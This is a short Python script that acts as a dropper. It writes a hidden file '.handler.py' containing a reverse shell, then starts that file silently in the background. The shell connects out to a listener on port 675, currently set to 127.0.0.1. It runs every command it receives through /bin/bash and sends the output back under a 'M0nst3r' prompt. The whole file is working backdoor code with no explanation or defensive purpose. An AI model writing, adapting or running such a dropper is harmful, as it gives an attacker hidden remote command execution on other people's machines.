#coding: utf-8
import os, time

arq = open(".handler.py", "w")
arq.write('''#coding: utf-8
import socket, os, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 675

s.connect((host, port))

s.send(str.encode('M0nst3r'+str(os.getcwd()) + '> '))

while True:
	data = s.recv(1024)

	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		
		output_bytes = cmd.stdout.read() + cmd.stderr.read()

		output_str = str(output_bytes, 'utf-8')

		s.send(str.encode(output_str + str('M0nst3r') + str(os.getcwd()) + '> '))
''')

arq.close()

os.system("python3 .handler.py &>> /dev/null")

